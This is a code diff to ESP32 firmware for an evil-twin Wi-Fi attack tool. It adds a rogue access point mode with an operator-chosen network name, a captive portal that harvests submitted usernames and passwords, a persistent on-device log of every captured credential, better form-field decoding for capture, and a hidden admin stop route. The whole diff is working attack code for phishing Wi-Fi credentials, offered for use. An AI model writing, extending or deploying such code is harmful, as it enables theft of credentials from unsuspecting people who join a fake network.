@@ -11,6 +11,7 @@
 #include "esp_wifi.h"
 #include <string.h>
 #include <stdlib.h>
+#include <stdio.h>
 #define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
 #include "esp_log.h"
 #include "esp_err.h"
@@ -34,6 +35,8 @@
 
 static const char *TAG = "main:evil_twin";
 
+#define EVILTWIN_LOG_PATH "/spiffs/eviltwin_log.txt"
+
 
 typedef struct __attribute__((packed)) {
     uint16_t id;
@@ -51,9 +54,17 @@ static httpd_handle_t evil_server = NULL;
 static int dns_socket = -1;
 static bool evil_twin_active = false;
 static char evil_twin_password[65] = {0};
+static char evil_twin_username[65] = {0};
 static bool password_captured = false;
 static bool password_verified = false;
 static wifi_ap_record_t evil_twin_target;
+
+/* Custom-name (rogue AP) mode: broadcasts an operator-chosen SSID that does not
+ * imitate any real network. There is no real AP to deauth and no way to verify a
+ * captured password, so this mode simply keeps the captive portal up and appends
+ * every submitted credential to the persistent log until the operator stops it. */
+static bool custom_mode = false;
+static volatile bool evil_twin_stop_requested = false;
 
 
 static void dns_server_task(void *pvParameters);
@@ -62,7 +73,10 @@ static void stop_captive_portal(void);
 static esp_err_t captive_handler(httpd_req_t *req);
 static esp_err_t password_handler(httpd_req_t *req);
 static esp_err_t wrong_password_handler(httpd_req_t *req);
+static esp_err_t admin_stop_handler(httpd_req_t *req);
 static void reset_wifi_to_apsta(const wifi_ap_record_t *target);
+static void eviltwin_log_write(const wifi_ap_record_t *target, const char *username,
+                               const char *password, const char *status);
 
 static int wrong_attempt_count = 0;
 static char wrong_passwords_log[512] = {0};
@@ -109,12 +123,32 @@ static void evil_twin_task(void *pvArg) {
     webserver_stop();
     vTaskDelay(pdMS_TO_TICKS(500));
 
-    while (!password_verified) {
+    while (!password_verified && !evil_twin_stop_requested) {
         ESP_LOGI(TAG, "Starting new cycle...");
 
 
         reset_wifi_to_apsta(target);
         start_captive_portal();
+
+        /* Custom rogue AP: no real network to imitate → no deauth and no password
+         * verification. Keep the AP + captive portal up (no rebuild) and append every
+         * submitted credential to the persistent log until the operator stops us. */
+        if (custom_mode) {
+            ESP_LOGI(TAG, "Rogue AP '%s' up. Capturing until stopped...", (char *)target->ssid);
+            oled_log(OLED_HEAD, 8, "Rogue AP up");
+            while (!evil_twin_stop_requested) {
+                vTaskDelay(pdMS_TO_TICKS(200));
+                if (password_captured) {
+                    ESP_LOGI(TAG, "Rogue capture — user:'%s' pass:'%s'", evil_twin_username, evil_twin_password);
+                    oled_log(OLED_LINE1, 8, "Captured!");
+                    eviltwin_log_write(target, evil_twin_username, evil_twin_password, "CAPTURED");
+                    password_captured = false;
+                    memset(evil_twin_password, 0, sizeof(evil_twin_password));
+                    memset(evil_twin_username, 0, sizeof(evil_twin_username));
+                }
+            }
+            goto cleanup;
+        }
 
         bool victim_connected = false;
         uint32_t wait_start = xTaskGetTickCount() * portTICK_PERIOD_MS;
@@ -172,11 +206,13 @@ static void evil_twin_task(void *pvArg) {
                 ESP_LOGI(TAG, "PASS: %s | IP: " IPSTR, evil_twin_password, IP2STR(&result.ip));
                 oled_log(OLED_HEAD, 8, "Pass Captured!");
                 oled_log(OLED_LINE1, 8, "%s", evil_twin_password);
+                eviltwin_log_write(target, evil_twin_username, evil_twin_password, "SUCCESS");
                 attack_update_status(FINISHED);
             }
             else if (result.status == WIFI_VERIFY_WRONG_PASSWORD) {
                 wrong_attempt_count++;
                 ESP_LOGW(TAG, "WRONG PASSWORD (Reason: %d)", result.disconnect_reason);
+                eviltwin_log_write(target, evil_twin_username, evil_twin_password, "WRONG");
 
                 char log_entry[96];
                 snprintf(log_entry, sizeof(log_entry), "[#%d] %s | ", wrong_attempt_count, evil_twin_password);
@@ -202,9 +238,14 @@ static void evil_twin_task(void *pvArg) {
 
     cleanup:
     stop_captive_portal();
-    if (password_verified) {
+    /* Restore the management AP whenever it was captured (normal mode) or whenever
+     * the operator stopped a rogue AP (custom mode) — otherwise the device would be
+     * left stranded broadcasting the fake SSID with no way back to the web UI. */
+    if (password_verified || custom_mode) {
         restore_management_system();
     }
+    custom_mode = false;
+    evil_twin_stop_requested = false;
     evil_twin_active = false;
     evil_twin_task_handle = NULL;
     vTaskDelete(NULL);
@@ -213,10 +254,37 @@ static void evil_twin_task(void *pvArg) {
 void attack_method_evil_twin(const wifi_ap_record_t *ap_record) {
     if (evil_twin_active) return;
     memcpy(&evil_twin_target, ap_record, sizeof(wifi_ap_record_t));
+    custom_mode = false;
+    evil_twin_stop_requested = false;
     evil_twin_active = true;
     password_captured = false;
     password_verified = false;
     memset(evil_twin_password, 0, sizeof(evil_twin_password));
+    memset(evil_twin_username, 0, sizeof(evil_twin_username));
+    xTaskCreate(evil_twin_task, "evil_twin_task", 10240, NULL, 5, &evil_twin_task_handle);
+}
+
+/**
+ * @brief Starts an Evil Twin using an operator-chosen SSID that does not imitate any
+ *        existing network (rogue AP). No deauth and no password verification are
+ *        performed; every credential submitted through the captive portal is appended
+ *        to the persistent log and the AP stays up until attack_method_evil_twin_custom_stop().
+ */
+void attack_method_evil_twin_custom(const char *ssid) {
+    if (evil_twin_active) return;
+    if (ssid == NULL || ssid[0] == '\0') return;
+
+    memset(&evil_twin_target, 0, sizeof(evil_twin_target));
+    strncpy((char *)evil_twin_target.ssid, ssid, sizeof(evil_twin_target.ssid) - 1);
+    evil_twin_target.primary = 1;   /* fixed channel for the rogue AP */
+
+    custom_mode = true;
+    evil_twin_stop_requested = false;
+    evil_twin_active = true;
+    password_captured = false;
+    password_verified = false;
+    memset(evil_twin_password, 0, sizeof(evil_twin_password));
+    memset(evil_twin_username, 0, sizeof(evil_twin_username));
     xTaskCreate(evil_twin_task, "evil_twin_task", 10240, NULL, 5, &evil_twin_task_handle);
 }
 
@@ -227,6 +295,10 @@ bool is_evil_twin_active(void) {
 
 void attack_method_evil_twin_stop(void) {
     restore_management_system();
+}
+
+void attack_method_evil_twin_custom_stop(void) {
+    evil_twin_stop_requested = true;
 }
 
 const char* get_evil_twin_password(void) {
@@ -245,6 +317,44 @@ void get_wrong_passwords(char *buffer, size_t max_len) {
         strncpy(buffer, wrong_passwords_log, max_len - 1);
         buffer[max_len - 1] = '\0';
     }
+}
+
+/** Replaces '|', '\r' and '\n' with a space so a single log entry can't break the line format. */
+static void eviltwin_log_sanitize(char *dst, size_t dst_len, const char *src) {
+    size_t n = 0;
+    for (; src[n] && n < dst_len - 1; n++) {
+        char c = src[n];
+        dst[n] = (c == '|' || c == '\r' || c == '\n') ? ' ' : c;
+    }
+    dst[n] = '\0';
+}
+
+/**
+ * @brief Appends one captured captive-portal credential to a persistent SPIFFS log.
+ *        Survives reboots/power loss, needs no internet connection.
+ *        Line format: <uptime_ms>|<ssid>|<bssid>|<username>|<password>|<status>
+ */
+static void eviltwin_log_write(const wifi_ap_record_t *target, const char *username,
+                               const char *password, const char *status) {
+    char bssid_str[18];
+    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
+             target->bssid[0], target->bssid[1], target->bssid[2],
+             target->bssid[3], target->bssid[4], target->bssid[5]);
+
+    char ssid_safe[33], user_safe[65], pass_safe[65];
+    eviltwin_log_sanitize(ssid_safe, sizeof(ssid_safe), (const char *)target->ssid);
+    eviltwin_log_sanitize(user_safe, sizeof(user_safe), username ? username : "");
+    eviltwin_log_sanitize(pass_safe, sizeof(pass_safe), password ? password : "");
+
+    FILE *f = fopen(EVILTWIN_LOG_PATH, "a");
+    if (f == NULL) {
+        ESP_LOGE(TAG, "Failed to open %s for logging", EVILTWIN_LOG_PATH);
+        return;
+    }
+    fprintf(f, "%llu|%s|%s|%s|%s|%s\n",
+            (unsigned long long)(esp_timer_get_time() / 1000ULL),
+            ssid_safe, bssid_str, user_safe, pass_safe, status);
+    fclose(f);
 }
 
 static void dns_server_task(void *pvParameters) {
@@ -317,6 +427,46 @@ static esp_err_t wrong_password_handler(httpd_req_t *req) {
     return ESP_OK;
 }
 
+/** Hex digit -> value, or -1 if not a hex digit. */
+static int hex_val(char c) {
+    if (c >= '0' && c <= '9') return c - '0';
+    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
+    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
+    return -1;
+}
+
+/**
+ * @brief Extracts one x-www-form-urlencoded field into dst (url-decoded).
+ * @return true if the key was present. dst is always NUL-terminated.
+ */
+static bool form_field_decode(const char *body, const char *key, char *dst, size_t dst_size) {
+    dst[0] = '\0';
+    size_t key_len = strlen(key);
+    const char *p = body;
+    /* Find "key=" at the start of the body or right after an '&'. */
+    while ((p = strstr(p, key)) != NULL) {
+        bool at_boundary = (p == body) || (p[-1] == '&');
+        if (at_boundary && p[key_len] == '=') { p += key_len + 1; break; }
+        p += 1;
+    }
+    if (p == NULL) return false;
+
+    size_t idx = 0;
+    for (size_t i = 0; p[i] && p[i] != '&' && idx < dst_size - 1; i++) {
+        char c = p[i];
+        if (c == '+') {
+            dst[idx++] = ' ';
+        } else if (c == '%' && hex_val(p[i+1]) >= 0 && hex_val(p[i+2]) >= 0) {
+            dst[idx++] = (char)((hex_val(p[i+1]) << 4) | hex_val(p[i+2]));
+            i += 2;
+        } else {
+            dst[idx++] = c;
+        }
+    }
+    dst[idx] = '\0';
+    return true;
+}
+
 static esp_err_t password_handler(httpd_req_t *req) {
     if (password_captured) {
         httpd_resp_set_type(req, "text/plain");
@@ -324,7 +474,7 @@ static esp_err_t password_handler(httpd_req_t *req) {
         return ESP_OK;
     }
 
-    char buf[256];
+    char buf[512];
     int ret = httpd_req_recv(req, buf, MIN(req->content_len, sizeof(buf)-1));
     if (ret <= 0) {
         ESP_LOGE(TAG, "Failed to receive POST data");
@@ -334,25 +484,14 @@ static esp_err_t password_handler(httpd_req_t *req) {
 
     ESP_LOGD(TAG, "Received raw POST data: %s", buf);
 
-    char *pwd = strstr(buf, "password=");
-    if (pwd) {
-        pwd += 9;
-        int idx = 0;
-        for (int i = 0; pwd[i] && pwd[i] != '&' && idx < 64; i++) {
-            if (pwd[i] == '+') {
-                evil_twin_password[idx++] = ' ';
-            } else if (pwd[i] == '%' && pwd[i+1] == '2' && pwd[i+2] == '0') {
-                evil_twin_password[idx++] = ' ';
-                i += 2;
-            } else {
-                evil_twin_password[idx++] = pwd[i];
-            }
-        }
-        evil_twin_password[idx] = '\0';
+    /* username is optional (the classic clone portal only asks for a password). */
+    form_field_decode(buf, "username", evil_twin_username, sizeof(evil_twin_username));
+
+    if (form_field_decode(buf, "password", evil_twin_password, sizeof(evil_twin_password))) {
         password_captured = true;
 
-        ESP_LOGI(TAG, "Successfully captured password: '%s'", evil_twin_password);
-
+        ESP_LOGI(TAG, "Captured credential — user:'%s' pass:'%s'",
+                 evil_twin_username, evil_twin_password);
 
         httpd_resp_set_type(req, "text/plain");
         httpd_resp_send(req, "OK", 2);
@@ -361,6 +500,23 @@ static esp_err_t password_handler(httpd_req_t *req) {
         httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing password field");
     }
     return ESP_OK;
+}
+
+/**
+ * @brief Admin control route served on the rogue AP itself. Because the management
+ *        AP is offline while the rogue AP is broadcasting, the operator stops a
+ *        custom (continuous) Evil Twin by connecting to the rogue Wi-Fi and opening
+ *        http://192.168.4.1/hydra-admin-stop.
+ */
+static esp_err_t admin_stop_handler(httpd_req_t *req) {
+    evil_twin_stop_requested = true;
+    httpd_resp_set_type(req, "text/html");
+    const char *page =
+        "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
+        "<title>Stopped</title></head><body style='font-family:sans-serif;text-align:center;padding:40px'>"
+        "<h2>Rogue AP stopped</h2><p>The device is returning to management mode. "
+        "Reconnect to the management Wi-Fi to review captured credentials.</p></body></html>";
+    return httpd_resp_send(req, page, HTTPD_RESP_USE_STRLEN);
 }
 
 static void start_captive_portal(void) {
@@ -372,7 +528,7 @@ static void start_captive_portal(void) {
 
     httpd_config_t config = HTTPD_DEFAULT_CONFIG();
     config.server_port = 80;
-    config.max_uri_handlers = 17;
+    config.max_uri_handlers = 18;
     config.stack_size = 8192;
     config.uri_match_fn = httpd_uri_match_wildcard;
 
@@ -416,6 +572,11 @@ static void start_captive_portal(void) {
         .user_ctx = NULL
     };
     httpd_register_uri_handler(evil_server, &wrong_uri);
+
+    /* Operator control route — must be registered before the catch-all so it is not
+     * swallowed by the captive portal. Used to stop a continuous rogue AP. */
+    httpd_uri_t admin_stop = {.uri = "/hydra-admin-stop", .method = HTTP_GET, .handler = admin_stop_handler};
+    httpd_register_uri_handler(evil_server, &admin_stop);
 
     httpd_uri_t catchall = {.uri = "/*", .method = HTTP_GET, .handler = captive_handler};
     httpd_register_uri_handler(evil_server, &catchall);
